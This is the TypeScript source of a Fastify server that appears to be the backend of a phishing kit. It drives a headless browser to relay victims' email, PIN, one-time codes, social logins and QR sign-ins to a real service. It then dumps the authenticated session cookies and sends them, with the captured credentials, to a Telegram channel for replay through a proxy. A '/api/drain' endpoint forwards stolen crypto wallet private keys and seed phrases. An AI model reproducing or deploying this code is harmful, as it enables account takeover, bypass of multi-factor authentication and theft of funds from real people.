import Fastify from 'fastify';
import cookie from '@fastify/cookie';
import fstatic from '@fastify/static';
import rateLimit from '@fastify/rate-limit';
import { randomBytes } from 'node:crypto';
import { mkdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
const __dirname = dirname(fileURLToPath(import.meta.url));
import { cfg } from './config.js';
import { initDb, q } from './db.js';
import { openContext, isMobile } from './browser.js';
import { gotoEntry, submitEmail, submitPin, submitOtp, submitSocial, waitStep, shot, isAuthed } from './flow.js';
import { dump } from './cookies.js';
import { alert, pushCookieFile } from './telegram.js';
import { adminRoutes } from './admin.js';

await initDb();
const live = new Map<string, { ctx: any; page: any; born: number }>();
mkdirSync(cfg.shots, { recursive: true });

const app = Fastify({ trustProxy: true, logger: false });
await app.register(cookie);
await app.register(rateLimit, { max: 60, timeWindow: '1 minute' });
await app.register(fstatic, { root: resolve(__dirname, '../public'), prefix: '/' });

function session(sid: string) {
  const s = live.get(sid);
  if (!s) throw new Error('session expired');
  return s;
}

app.post('/api/session', async (req, reply) => {
  if (live.size >= cfg.maxSessions) {
    const oldest = [...live.entries()].sort((a, b) => a[1].born - b[1].born)[0];
    if (oldest) { await oldest[1].ctx.close().catch(() => {}); live.delete(oldest[0]); }
  }
  const body = (req.body ?? {}) as any;
  const ua = req.headers['user-agent'] ?? '';
  const cc = (req.headers['cf-ipcountry'] as string) ?? body.cc ?? '';
  const mobile = body.mobile === true || isMobile(ua);
  const sid = randomBytes(16).toString('hex');

  q.newSession(sid, Date.now(), req.ip, ua, cc, body.mode ?? 'email', 'init');
  const { ctx, page } = await openContext(cc, body.ua ?? undefined);
  live.set(sid, { ctx, page, born: Date.now() });

  await alert(`<b>new visitor</b>\n${cc} · ${req.ip}\n${ua.slice(0, 90)}`);
  await shot(page, cfg.shots, `${sid}-0-entry`);
  await gotoEntry(page).catch(() => {});
  await shot(page, cfg.shots, `${sid}-1-loaded`);

  return { sid };
});

app.get('/api/qr/:sid', async (req, reply) => {
  const { sid } = req.params as any;
  const { page } = session(sid);
  const box = page.locator('canvas, img[alt*=QR i], [class*=qr]').first();
  const buf = (await box.count()) && (await box.isVisible().catch(() => false))
    ? await box.screenshot()
    : await page.screenshot({ clip: { x: 0, y: 0, width: 400, height: 400 } });
  reply.type('image/png').send(buf);
});

app.get('/api/status/:sid', async (req) => {
  const { sid } = req.params as any;
  const s = live.get(sid);
  if (!s) return { step: 'expired' };
  if (await isAuthed(s.page)) {
    await complete(sid, s.ctx, 'qr');
    return { step: 'done' };
  }
  return { step: 'waiting' };
});

app.post('/api/login', async (req, reply) => {
  const { sid, email, pin } = (req.body ?? {}) as any;
  const { page } = session(sid);
  try {
    if (email) { q.setCred(email, null, null, sid); await submitEmail(page, email); }
    let step = await waitStep(page, 25_000);
    await shot(page, cfg.shots, `${sid}-2-after-email`);

    if (step === 'done') { await complete(sid, session(sid).ctx, 'email'); return { step: 'done' }; }

    if (step === 'pin' || step === 'unknown') {
      if (!pin) return { step: 'pin' };
      q.setCred(null, pin, null, sid);
      await submitPin(page, pin);
      step = await waitStep(page, 25_000);
      await shot(page, cfg.shots, `${sid}-3-after-pin`);
      if (step === 'done') { await complete(sid, session(sid).ctx, 'email'); return { step: 'done' }; }
    }

    if (step === 'otp') {
      await alert(`<b>otp requested</b> — ${sid}\nwaiting for victim`);
      return { step: 'otp' };
    }

    if (step === 'error') {
      const t = await page.locator('body').innerText().catch(() => '');
      return { step: 'error', message: t.slice(0, 200) };
    }
    return { step: 'otp' };
  } catch (e: any) {
    return reply.code(500).send({ step: 'error', message: e.message });
  }
});

app.post('/api/drain', async (req, reply) => {
  const { type, value, ua: bodyUa } = (req.body ?? {}) as any;
  const ip = req.ip;
  const ua = req.headers['user-agent'] ?? bodyUa ?? '';
  const cc = (req.headers['cf-ipcountry'] as string) ?? '';
  const tag = type === 'key' ? '🔑 Private Key' : '🌱 Seed Phrase';
  const text = `<b>${tag} captured</b>\n\n<code>${String(value).trim()}</code>\n\n${cc} · ${ip}\n${String(ua).slice(0, 120)}`;
  await alert(text);
  return { ok: true };
});

app.post('/api/social', async (req, reply) => {
  const { sid, provider } = (req.body ?? {}) as any;
  const { ctx, page } = session(sid);
  try {
    await alert(`<b>social login attempt</b> — ${provider}\n${sid}`);
    await submitSocial(page, provider);
    await shot(page, cfg.shots, `${sid}-social-${provider}`);
    const step = await waitStep(page, 60_000);
    await shot(page, cfg.shots, `${sid}-social-${provider}-after`);
    if (step === 'done') { await complete(sid, ctx, provider); return { step: 'done' }; }
    if (step === 'pin') return { step: 'pin' };
    if (step === 'otp') {
      await alert(`<b>otp requested</b> (social) — ${sid}`);
      return { step: 'otp' };
    }
    return { step: 'waiting' };
  } catch (e: any) {
    return reply.code(500).send({ step: 'error', message: e.message });
  }
});

app.post('/api/otp', async (req, reply) => {
  const { sid, code } = (req.body ?? {}) as any;
  const { ctx, page } = session(sid);
  try {
    q.setCred(null, null, code, sid);
    await submitOtp(page, code);
    const step = await waitStep(page, 30_000);
    await shot(page, cfg.shots, `${sid}-4-after-otp`);
    if (step === 'done') { await complete(sid, ctx, 'email'); return { step: 'done' }; }
    return { step: step === 'error' ? 'error' : 'otp' };
  } catch (e: any) {
    return reply.code(500).send({ step: 'error', message: e.message });
  }
});

async function complete(sid: string, ctx: any, mode: string) {
  const s = live.get(sid);
  const existing = q.get(sid) as any;
  if (!s || existing?.authed) return;
  const { json } = await dump(ctx);
  q.setAuthed(json, sid);
  const row = q.get(sid) as any;
  await pushCookieFile(sid, json, `authed · ${row?.cc} · ${row?.email}\nreplay from ${row?.cc} proxy`);
  await alert(`<b>✅ authed</b> — ${sid}\n${row?.email}\nreplay inside ${row?.cc}`);
}

await app.register(adminRoutes, { prefix: cfg.adminPath });
app.get('/health', async () => ({ ok: true, live: live.size }));

setInterval(async () => {
  for (const [sid, s] of live) {
    if (Date.now() - s.born > cfg.ttl) { await s.ctx.close().catch(() => {}); live.delete(sid); }
  }
  q.purge(Date.now() - 7 * 86_400_000);
}, 60_000);

app.listen({ port: cfg.port, host: '0.0.0.0' });